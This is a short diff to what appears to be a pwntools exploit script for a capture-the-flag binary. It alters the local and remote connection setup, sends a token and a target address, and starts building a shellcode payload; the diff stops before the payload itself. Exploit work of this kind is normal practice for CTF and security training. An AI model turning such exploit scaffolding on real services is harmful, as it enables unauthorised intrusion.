@@ -6,10 +6,11 @@ context.terminal = ['tmux','splitw','-h','-p','77']
 # context.binary = exe = ELF('./chall')
 context.bits = 64; context.arch = 'amd64'
 
-if args.LOCAL: io = process(['./chall'])
-else: io = remote(sys.argv[1], sys.argv[2])
+if args.LOCAL: io = process(['./chall'], env={'TOKEN':'task_token'})
+else: io = remote(sys.argv[1], 13001)
 
-# gdb.attach(io, '')
+
+io.sendlineafter(b'token: ', b'task_token')
 
 io.sendlineafter(b'Address: ', str(0xdead00f).encode())
 pl =  b''                   # rax = 0, rsi = rdx = 0xdead00f, rdi = last char in shellcode
